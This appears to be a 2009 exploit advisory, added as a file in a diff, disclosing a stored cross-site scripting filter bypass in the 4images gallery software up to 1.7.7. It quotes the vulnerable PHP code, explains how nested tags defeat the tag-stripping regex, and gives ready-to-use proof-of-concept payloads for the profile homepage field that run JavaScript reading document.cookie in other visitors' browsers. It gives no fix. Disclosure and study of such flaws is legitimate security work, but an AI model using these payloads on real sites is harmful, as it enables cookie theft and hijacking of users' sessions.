@@ -1,0 +1,144 @@
+                  ||          ||   | ||
+           o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
+          (  :  /    (_)    /           (      .
+
+
+=By: 	Qabandi
+=Email:	iqa[a]hotmail.fr
+
+	From Kuwait, PEACE...
+
+=Vuln:		4images <= 1.7.7 - filter bypass HTML injection/XSS
+=INFO:		~~~
+=BUY:  		~~~
+=DORK:  	~~~
+
+                             _-=/:Conditions:\=-_
+---------------------------------------------------------------------------------
+; Magic quotes for incoming GET/POST/Cookie data.
+magic_quotes_gpc = Off
+
+Comments allowed[+]
+Registration[+]
+
+Works on default 4images comments settings. 
+
+XSS used works with latest FireFox browser, you can use your own code.
+--------------------------------------=_=---------------------------------------
+
+                            _-=/:Vulnerable_Code:\=-_
+---------------------------------------------------------------------------------
+in "./4images/details.php" we see::--//First-Mistake//--
+
+380::        $comment_user_homepage = (isset($comment_row[$i][$user_table_fields['user_homepage']])) ? format_url($comment_row[$i][$user_table_fields['user_homepage']]) : "";
+381::        if (!empty($comment_user_homepage)) {
+
+//as you can see, it just grabs whatever is in the SQL database and adds it, puts it thru format_url()
+//which is nothing and relies on the filter when creating or editing USER_HOMEPAGE
+//lets take a look what happends when updating user_homepage
+
+in "./4images/member.php":://this what happends when UPDATING user_homepage thru the profile page
+
+1053::        $user_homepage = (isset($HTTP_POST_VARS['user_homepage'])) ? format_url(un_htmlspecialchars(trim($HTTP_POST_VARS['user_homepage']))) : "";
+
+//user_homepage goes thru THREE functions, lets see what they do..
+//format_url();
+
+function format_url($url) {
+  if (empty($url)) {
+    return '';
+  }
+
+  if (!preg_match("/^https?:\/\//i", $url)) {
+    $url = "http://".$url;
+  }
+
+  return $url;
+}
+///ok cool makes sure the URL is cool
+
+//trim() <-- built in PHP function
+
+//un_htmlspecialchars();
+
+function un_htmlspecialchars($text) {
+  $text = str_replace(
+    array('&lt;', '&gt;', '&quot;', '&amp;'),
+    array('<',    '>',    '"',      '&'),
+    $text
+  );
+
+  return $text;
+}
+
+//interesting but im afraid this is another mistake Q_Q
+
+//anyway, point is the XSS filter in GLOBAL.PHP can be bypassed
+// Lets take a small look at what the script does with all vars
+
+in "./4images/global.php"::
+
+181::  // Remove really unwanted tags
+182::  do {
+183::    $oldstring = $string;
+184::    $string = preg_replace('#</*(applet|meta|xml|blink|link|style|script|embed|object|iframe|frame|frameset|ilayer|layer|bgsound|title|base)[^>]*>#i',"",$string);
+185::  } while ($oldstring != $string);
+186::
+187::  return $string;
+188:: }
+
+//Can be bypassed..
+// since it looks for <script> and replaces it with nothing, we can use the old <scr<script>ipt> method
+// but a bit more advanced.
+---------------------------------------=_=--------------------------------------
+
+                                 _-=/:P.o.C:\=-_
+---------------------------------------------------------------------------------
+
+all we need is a user account, so register then go to your edit profile:
+( ./4images/member.php?action=editprofile )
+
+at the HOMEPAGE input box, type the following:
+
+http://www.dummy.com/"><script>alert('qabandi')</script>
+
+The script will convert it to : 
+
+http://www.dummy.com/">alert('qabandi')
+
+now type this :)
+
+http://"><body<script> <script>on<script>loa<script>d="javascript:alert(document.cookie);qabandi" />
+
+Result after SAVE:
+
+http://"><body onload="javascript:alert(document.cookie);qabandi" />
+
+BAAM!
+
+go to any picture like ( ./4images/details.php?image_id=1 )
+
+post a comment, refresh, and javascript will be executed.
+
+you pretty much can bypass any of the wordlist provided in global.php
+
+you can inject HTML code pretty much
+
+now this is good because this shows that you can bypass their filter, what else can you do other than xss i wonder?
+
+---------------------------------------=_=--------------------------------------
+
+                                _-=/:SOLUTION:\=-_
+---------------------------------------------------------------------------------
+Im sure the 4images team wont take advice from a 19 year old :)
+---------------------------------------=_=--------------------------------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-
+-=-=-=-==-=-=-=-=tkfoon=-la=-tis2aloony=-shlon=-=el-=-ta6beeq!=-=-=-==-=-=-=-=-=
+-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
+-==-=-=-=-==-=-==-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=---=-==-=-==-=-=-=-=-=-=--
+=-=-=-=-==-=-=--=-=-=-=-=-=-=-No----More---Private=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-
+Salamz to All Muslim Hackers.
+
+# milw0rm.com [2009-06-12]
